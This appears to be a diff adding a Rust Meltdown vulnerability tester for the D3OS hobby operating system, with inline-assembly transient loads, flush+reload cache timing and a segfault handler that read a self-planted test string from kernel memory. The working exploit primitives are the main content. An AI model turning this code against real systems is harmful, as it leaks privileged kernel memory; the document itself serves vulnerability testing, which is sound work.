@@ -1,0 +1,558 @@
+#![no_std]
+
+extern crate alloc;
+
+#[allow(unused_imports)]
+use runtime::*;
+use terminal::{print, println};
+use alloc::vec::Vec;
+use core::{ptr, mem};
+use alloc::alloc::{alloc, dealloc, handle_alloc_error, Layout};
+use signal::signal_vector::SignalVector;
+use signal::signal_handler::SignalHandler;
+use syscall::syscall;
+use syscall::SystemCall::{SignalHandlerRegister, ThreadSwitch, MeltdownCopyToKernelMemory, ProcessExit};
+use concurrent::thread;
+use alloc::string::String;
+use alloc::boxed::Box;
+use alloc::format;
+use crate::env::Args;
+use core::arch::asm;
+
+use sjlj::{setjmp, longjmp, JumpBuf};
+use spin::{Mutex};
+
+static jump_buf: Mutex<JumpBuf> = Mutex::new(JumpBuf::new());
+static jump_buf_direct_read: Mutex<JumpBuf> = Mutex::new(JumpBuf::new());
+
+const PAGE_SIZE: usize = 256;
+
+#[derive(Copy, Clone, Debug)] // Required to initialize an entire array with such objects
+#[allow(dead_code)]
+pub struct MemoryPage([u128; PAGE_SIZE]);
+
+pub struct Config {
+	measurements: u32,
+	accept_after: u32,
+	retries: u32,
+}
+
+pub fn meltdown(mem: &[MemoryPage], pointer: *const u8) {
+	unsafe {
+		asm!(
+			"2:", // jump here to restart if shift result was 0
+			"mov {tmp3}, [{tmp3}]", // this uses rsi in original, which is 0 and segfaults
+			"movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
+			"shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
+			"jz 2", // restart if shift result was 0
+			"mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
+			x = in(reg) pointer,
+			base = in(reg) &mem[0] as *const MemoryPage,
+			tmp = out(reg) _,
+			tmp2 = out(reg) _,
+			tmp3 = out(reg) _,
+		);
+	}
+}
+
+pub fn meltdown_nonull(mem: &[MemoryPage], pointer: *const u8) {
+	unsafe {
+		asm!(
+			"2:", // jump here to restart if shift result was 0
+			"movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
+			"shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
+			"jz 2", // restart if shift result was 0
+			"mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
+			x = in(reg) pointer,
+			base = in(reg) &mem[0] as *const MemoryPage,
+			tmp = out(reg) _,
+			tmp2 = out(reg) _,
+		);
+	}
+}
+
+pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u8) {
+	unsafe {
+		asm!(
+			"movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to specify that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
+			"shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
+			"mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
+			x = in(reg) pointer,
+			base = in(reg) &mem[0] as *const MemoryPage,
+			tmp = out(reg) _,
+			tmp2 = out(reg) _,
+		);
+	}
+}
+
+pub fn rdtsc() -> u64 {
+	let high: u32;
+	let low: u32;
+	unsafe {
+		asm!(
+			"mfence", // Apparently it was the mfence instructions here which caused all memory accesses to be fast (below threshold), making meltdown attack impossible
+			"rdtsc",
+			"mfence", // TODO: This is after combining both 32bit parts of the result in the original, i.e. the last line before return
+			out("eax") low, // TODO: Can we use rax and rdx instead, to skip combining?
+			out("edx") high
+		);
+	}
+	((high as u64) << 32) | (low as u64)
+}
+
+pub fn maccess(pointer: *const MemoryPage) {
+	unsafe {
+		asm!(
+			"mov {tmp}, [{x}]",
+			x = in(reg) pointer,
+			tmp = out(reg) _,
+		);
+	}
+}
+
+pub fn flush(pointer: *const MemoryPage) {
+	unsafe {
+		asm!(
+			"clflush [{x}]",
+			x = in(reg) pointer,
+		);
+	}
+}
+
+pub fn flush_reload(cache_miss_threshold: u64, pointer: *const MemoryPage) -> bool {
+	let start_time: u64;
+	let end_time: u64;
+	
+	start_time = rdtsc();
+	maccess(pointer);
+	end_time = rdtsc();
+	
+	flush(pointer); // The entry is probably cached now no matter whether it was cached before, flush it so we don't expell the entry we are looking for from the cache by caching all other entries
+	
+	end_time - start_time < cache_miss_threshold
+}
+
+struct SegfaultHandler {
+	
+}
+
+impl SignalHandler for SegfaultHandler {
+	fn trigger(&self) {
+		println!("Signal handler triggered!");
+	}
+}
+
+// Debugging only, to be replaced by a struct with SignalHandler trait
+pub fn handle_signal() {
+	unsafe {
+		if let Some(ref mut buf) = jump_buf_direct_read.try_lock() {
+			longjmp(&mut *buf, 1);
+		} else {
+			longjmp(&mut *jump_buf.lock(), 1);
+		}
+	}
+}
+
+pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> usize {
+	//println!("Called libkdump_read_signal_handler for pointer {:?}", pointer);
+	for iteration in 0..config.retries {
+		print!("  {}\x1b[1D\x1b[1D\x1b[1D", iteration / 1000);
+		unsafe {
+			if setjmp(&mut *jump_buf.lock()) == 0 {
+				meltdown_fast(mem, pointer);
+			} else {
+				print!(" c\x1b[1D\x1b[1D");
+				jump_buf.force_unlock();
+			}
+		}
+		
+		for i in 0..mem.len() {
+			if flush_reload(cache_miss_threshold, &mem[i] as *const MemoryPage) {
+				if i >= 1 { // TODO why ignore first entry?
+					//println!("cached value found: {}", i);
+					return i;
+				} else {
+					//println!("cached value found, but ignoring {}", i);
+				}
+			} else {
+				//println!("value {} not cached", i);
+			}
+			syscall(ThreadSwitch, &[]); // Apparently, switching threads here is important, as otherwise always the second or third entry gets returned, TODO find out why
+		}
+		syscall(ThreadSwitch, &[]); // Apparently this is important, see above
+	}
+	return 0; // Maybe this means to only return 0 (first entry) after ensuring it was not one of the other values?
+}
+
+pub fn libkdump_read(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> u32 {
+	// println!("Called libkdump_read for pointer {:?}", pointer);
+	const ARRAY_SIZE: usize = 256;
+	let mut res_stat: [u32; ARRAY_SIZE] = [0; ARRAY_SIZE];
+	
+	syscall(ThreadSwitch, &[]);
+	
+	for _ in 0..config.measurements {
+		// Per default, try loading and measuring the memory three times
+		// TODO: Add implementation using TSX?
+		// println!("Calling libkdump_read_signal_handler for pointer {:?}", pointer);
+		let r = libkdump_read_signal_handler(config, cache_miss_threshold, mem, pointer);
+		res_stat[r] += 1;
+	}
+	
+	let mut max_i = 0;
+	let mut max_v = res_stat[max_i];
+	for (i, v) in res_stat.iter().enumerate() {
+		if *v > max_v {
+			max_i = i;
+			max_v = *v;
+		}
+	}
+
+	if res_stat[max_i] > config.accept_after {
+		max_i as u32
+	} else {
+		0
+	}
+}
+
+pub fn detect_flush_reload_threshold(pointer: *const MemoryPage) -> u64{
+	let mut reload_time: u64 = 0;
+	let mut flush_reload_time: u64 = 0;
+	let count: u64 = 10000000;
+	let mut start_time: u64;
+	let mut end_time: u64;
+	
+	// TODO Use single value instead of array ok?    
+	maccess(pointer);
+	for _ in 0..count {
+		start_time = rdtsc();
+		maccess(pointer);
+		end_time = rdtsc();
+		reload_time += end_time - start_time;
+	}
+	
+	for _ in 0..count {
+		start_time = rdtsc();
+		maccess(pointer);
+		end_time = rdtsc();
+		flush(pointer);
+		flush_reload_time += end_time - start_time;
+	}
+	
+	println!("Total time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
+	reload_time /= count;
+	flush_reload_time /= count;
+	println!("Average time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
+	let threshold = (flush_reload_time + reload_time * 2) / 3;
+	println!("Threshold: {}", threshold);
+	return threshold;
+}
+
+fn print_thread() {
+	let thread_id = thread::current().expect("Can't get current thread!").id();
+	println!("Started print_thread {}!", thread_id);
+	
+	let space = 15+thread_id;
+	let filler = " ".repeat(space);
+	let revert = "\x1b[1D".repeat(space+1);
+	loop {
+		for i in 0..9 {
+			print!("{}{}{}", filler, i, revert);
+		}
+		syscall(ThreadSwitch, &[]);
+	}
+}
+
+fn nop_thread() {
+	let thread_id = thread::current().expect("Can't get current thread!").id();
+	println!("Started nop_thread {}!", thread_id);
+	
+	unsafe {
+		loop {
+			asm!("nop");
+		}
+	}
+}
+
+fn yield_thread() {
+	let thread_id = thread::current().expect("Can't get current thread!").id();
+	println!("Started yield_thread {}!", thread_id);
+	
+	loop {
+		syscall(ThreadSwitch, &[]);
+	}
+}
+
+fn load_thread() {
+	let thread_id = thread::current().expect("Can't get current thread!").id();
+	println!("Started load_thread {}!", thread_id);
+	
+	loop {
+		for i in 1..100 {
+			assert_eq!(i*i/i, i);
+		}
+	}
+}
+
+fn mem_thread() {
+	let thread_id = thread::current().expect("Can't get current thread!").id();
+	println!("Started mem_thread {}!", thread_id);
+	
+	// Create 1M memory array and fill each byte with the index of the corresponding 4K-page
+	// Copied from meltdown array initialisation below
+	const ARRAY_SIZE: usize = 256; // 256 entries, each containing 256 u128's, meaning 256*4K
+	let ptr;
+	let layout;
+	let mem: Vec<MemoryPage>;
+	let page_size = mem::size_of::<MemoryPage>();
+	let total_memory = page_size * ARRAY_SIZE;
+	
+	unsafe {
+		layout = Layout::from_size_align(total_memory, 4096).expect("Layout creation failed");
+		ptr = alloc(layout);
+		if ptr.is_null() {
+			handle_alloc_error(layout);
+		}
+		for i in 0..ARRAY_SIZE {
+			ptr::write_bytes(ptr.add(i * page_size), i as u8, page_size);
+		}
+		mem = Vec::from_raw_parts(ptr as *mut MemoryPage, ARRAY_SIZE, ARRAY_SIZE);
+	}
+	
+	// Repeatedly iterate over the array and check whether all entries are correct
+	loop {
+		for i in 0..ARRAY_SIZE {
+			let cur_ptr = &mem[i] as *const MemoryPage;
+			// Construct the correct value: 16 bytes each containing the value of i
+			let mut correct_value = i as u128;
+			for j in 1..16 {
+				correct_value += (i as u128) << j * 8;
+			}
+			
+			assert_eq!((cur_ptr as usize) % 4096, 0); // Check whether all elements are 4K aligned
+			for val in mem[i].0.iter() {
+				assert_eq!(*val, correct_value); // Check whether all elements are initialised with the value of i
+			}
+		}
+	}
+}
+
+enum LoadThreadKind {
+	PrintThread,
+	NopThread,
+	YieldThread,
+	LoadThread,
+	MemThread,
+}
+
+impl TryFrom<&str> for LoadThreadKind {
+	type Error = ();
+
+	fn try_from(value: &str) -> Result<Self, Self::Error> {
+		match value {
+			"PrintThread" => Ok(LoadThreadKind::PrintThread),
+			"NopThread" => Ok(LoadThreadKind::NopThread),
+			"YieldThread" => Ok(LoadThreadKind::YieldThread),
+			"LoadThread" => Ok(LoadThreadKind::LoadThread),
+			"MemThread" => Ok(LoadThreadKind::MemThread),
+			&_ => Err(()),
+		}
+	}
+}
+
+impl TryFrom<String> for LoadThreadKind {
+	type Error = ();
+	
+	fn try_from(value: String) -> Result<Self, Self::Error> {
+		LoadThreadKind::try_from(value.as_str())
+	}
+}
+
+type LoadThreadFn = fn();
+
+impl From<LoadThreadKind> for Box<LoadThreadFn> {
+	fn from(value: LoadThreadKind) -> Box<LoadThreadFn> {
+		match value {
+			LoadThreadKind::PrintThread => Box::new(print_thread),
+			LoadThreadKind::NopThread => Box::new(nop_thread),
+			LoadThreadKind::YieldThread => Box::new(yield_thread),
+			LoadThreadKind::LoadThread => Box::new(load_thread),
+			LoadThreadKind::MemThread => Box::new(mem_thread),
+		}
+	}
+}
+
+fn print_help() {
+	println!("Meltdown vulnerability tester for D3OS.");
+	println!("This application copies a string into protected kernel memory using a syscall.");
+	println!("Afterwards, the string is read using the Meltdown attack. If the system is");
+	println!("vulnerable for Meltdown, the string will be printed to the terminal. Page");
+	println!("Faults that occur during the attack are caught by registering a signal handler");
+	println!("for Segmentation Faults.");
+	println!("");
+	println!("Usage:");
+	println!("  -c, --print-charcodes: Print character code points instead of actual chars");
+	println!("  -l n kind, --load-threads n kind: Spawn n load threads of kind kind while");
+	println!("                                    running the attack, this sometimes");
+	println!("                                    improves performance.");
+	println!("  -h, --help: Print this help text");
+	syscall(ProcessExit, &[]);
+}
+
+struct Parameters {
+	print_charcodes: bool,
+	load_threads: u8,
+	load_thread_kind: LoadThreadKind,
+}
+
+fn parse_args(mut args: Args) -> Parameters {
+	args.next(); // Skip calling name
+	let mut parameters = Parameters {
+		print_charcodes: false,
+		load_threads: 0,
+		load_thread_kind: LoadThreadKind::LoadThread,
+	};
+	
+	loop {
+		if let Some(arg) = args.next() {
+			match arg.as_str() {
+				"-c" | "--print-charcodes" => parameters.print_charcodes = true,
+				"-l" | "--load-threads" => {
+					let load_threads_arg = args.next().expect("--load-threads requires an argument for load thread cound");
+					parameters.load_threads = load_threads_arg.parse::<u8>().expect(format!("load thread count needs to be a positive integer < 256, got {}", load_threads_arg).as_str());
+					let load_thread_kind_arg = args.next().expect("--load-threads requires an argument for load thread type");
+					parameters.load_thread_kind = LoadThreadKind::try_from(load_thread_kind_arg.as_str()).expect(format!("Invalid load thread type: {}", load_thread_kind_arg).as_str());
+				},
+				"-h" | "--help" => print_help(),
+				&_ => {
+					println!("Unrecognized argument: {}", arg);
+					print_help();
+				},
+			}
+		} else {
+			break;
+		}
+	}
+	
+	return parameters;
+}
+
+#[unsafe(no_mangle)]
+pub fn main() {
+	println!("Meltdown start\n");
+	let parameters = parse_args(env::args());
+	
+	println!("Address of handle_signal is {:x}", handle_signal as u64);
+	syscall(SignalHandlerRegister, &[SignalVector::SIGSEGV as usize, handle_signal as usize]);
+	const ARRAY_SIZE: usize = 256; // 256 entries, each containing 256 u128's, meaning 256*4K TODO: Original uses 300 non-aligned entries, skips the first 2 for alignment
+	let default_config = Config {
+		measurements: 3,
+		accept_after: 1,
+		retries: 10000,
+	};
+	
+	let ptr;
+	let layout;
+	let mem: Vec<MemoryPage>;
+	let page_size = mem::size_of::<MemoryPage>();
+	let total_memory = page_size * ARRAY_SIZE;
+	
+	unsafe {
+		layout = Layout::from_size_align(total_memory, 4096).expect("Layout creation failed");
+		ptr = alloc(layout);
+		if ptr.is_null() {
+			handle_alloc_error(layout);
+		}
+		for i in 0..ARRAY_SIZE {
+			ptr::write_bytes(ptr.add(i * page_size), i as u8, page_size);
+		}
+		mem = Vec::from_raw_parts(ptr as *mut MemoryPage, ARRAY_SIZE, ARRAY_SIZE);
+	}
+	
+	// Initialise the array with values holding the array index and verify that memory was assigned correctly
+	for i in 0..ARRAY_SIZE {
+		let cur_ptr = &mem[i] as *const MemoryPage;
+		// Construct the correct value: 16 bytes each containing the value of i
+		let mut correct_value = i as u128;
+		for j in 1..16 {
+			correct_value += (i as u128) << j * 8;
+		}
+		
+		assert_eq!((cur_ptr as usize) % 4096, 0); // Check whether all elements are 4K aligned
+		for val in mem[i].0.iter() {
+			assert_eq!(*val, correct_value); // Check whether all elements are initialised with the value of i
+		}
+	}
+	
+	// Cache line granularity is probably 64 bytes, therefore we step by 64 to flush the entire memory. Stepping by 4K is probably also enough, as we only access the first byte of each page, TODO check
+	for i in (0..total_memory).step_by(page_size) {
+		unsafe {
+			flush(ptr.add(i) as *const MemoryPage);
+		}
+	}
+	
+	let load_thread_fn = *Box::<LoadThreadFn>::from(parameters.load_thread_kind);
+	for i in 0..parameters.load_threads {
+		// TODO: Find out why load threads are used in the original
+		// TODO: Do we really need load threads?
+		thread::create(load_thread_fn);
+	}
+	
+	println!("Current CPU time: {}", rdtsc());
+	let cache_miss_threshold = detect_flush_reload_threshold(&mem[0] as *const MemoryPage);
+	
+	const secret_string: &str = "Whoever reads this is dumb.";
+	let SECRET = syscall(MeltdownCopyToKernelMemory, &[secret_string.as_ptr() as usize, secret_string.len() as usize]).expect("Syscall did not return value of secret in kernel space!") as *const u8;
+	
+	println!("Trying to read secret from address {:?} directly, expecting segmentation fault", SECRET);
+	let secret_string_kernel;
+	unsafe {
+		secret_string_kernel = String::from_raw_parts(SECRET as *mut u8, secret_string.len(), secret_string.len());
+	}
+	
+	println!("Successfully created string object at address {:p}, content at {:p}, trying to read secret...", &secret_string_kernel, secret_string_kernel.as_ptr());
+	
+	unsafe {
+		if setjmp(&mut *jump_buf_direct_read.lock()) == 0 {
+			//println!("{}", secret_string_kernel);
+			println!("No segmentation fault!");
+		} else {
+			println!("Got segmentation fault!");
+		}
+	}
+	
+	// Prevent using this buffer again, as we're past that now
+	// TODO: This could be less hacky
+	let lock = jump_buf_direct_read.lock();
+	
+	print!("Trying to read secret from address {:?} using meltdown...\nExpected: {}\n     Got: ", SECRET, secret_string);
+	
+	let mut index: usize = 0;
+	while index < secret_string.len() {
+		let pointer;
+		unsafe {
+			pointer = SECRET.add(index);
+		}
+		let result = libkdump_read(&default_config, cache_miss_threshold, &mem, pointer);
+		
+		if parameters.print_charcodes {
+			let value = result as u8;
+		} else {
+			let value = result as u8 as char;
+		}
+		
+		print!("{}", result); // TODO: Find out why this only prints 1 when using load threads
+		/*unsafe {
+			println!("Got value at address {:?}: {} real: {}", pointer, value, *pointer);
+		}*/
+		index += 1;
+	}
+	println!("");
+	
+	println!("Done. Deallocating now!");
+	unsafe {
+		dealloc(ptr, layout);
+	}
+	println!("Done deallocating. Exiting.");
+	// TODO: fix `panicked at linked_list_allocator-0.10.5/src/hole.rs:548:9: Hole list out of order?!` after deallocation here
+}
